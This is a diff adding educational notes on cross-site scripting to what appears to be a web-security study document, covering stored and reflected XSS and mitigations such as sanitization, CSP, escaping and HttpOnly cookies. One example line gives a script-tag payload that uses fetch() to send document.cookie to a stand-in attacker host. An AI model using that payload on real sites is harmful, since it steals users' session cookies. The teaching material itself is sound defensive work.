@@ -142,3 +142,23 @@ Example Form:
 8. **HttpOnly and Secure Attributes**: Mark cookies as `HttpOnly` to prevent access via JavaScript and `Secure` to ensure they are sent over HTTPS.
 9. **Validate Referer Header**: Check the `Referer` header in HTTP requests to ensure requests are coming from allowed domains.
 10. **User Education**: Educate users about the risks of phishing and the importance of security practices, such as not clicking on suspicious links.
+
+
+# XSS Attack and Mitigation
+
+## XSS Attack
+1. **XSS Definition**: Cross-Site Scripting (XSS) is a security vulnerability where an attacker injects malicious scripts into web pages viewed by other users.
+2. **Attack Example**: An attacker posts a malicious script on `www.legitbank.com` through a comment section: `<script>fetch('https://www.attackersite.com/steal-cookie?cookie=' + document.cookie);</script>`.
+3. **Script Execution**: When other users view the page, the script executes in their browser, potentially stealing their session cookies or performing other malicious actions.
+4. **localStorage Exploitation**: If `www.legitbank.com` stores sensitive tokens in `localStorage`, a similar script can send these tokens to `www.attackersite.com`.
+5. **Types of XSS**:
+    - *Stored XSS*: The malicious script is stored on the target server (e.g., in a database) and is executed every time the compromised page is loaded.
+    - *Reflected XSS*: The malicious script is part of the request sent to the server and is reflected back in the server's response.
+
+## Mitigation Strategies
+6. **Input Sanitization**: Implement server-side input sanitization to prevent malicious scripts from being saved or executed.
+7. **Content Security Policy (CSP)**: Use CSP headers to restrict where scripts can load from, reducing the risk of executing injected scripts.
+8. **Escaping User Output**: Escape special characters in user-generated content before rendering them on web pages.
+9. **HttpOnly Cookies**: Use `HttpOnly` flag on cookies to prevent JavaScript from accessing them, protecting session cookies from being stolen by scripts.
+10. **Regular Security Audits**: Conduct vulnerability assessments and security reviews to identify and fix XSS vulnerabilities.
+
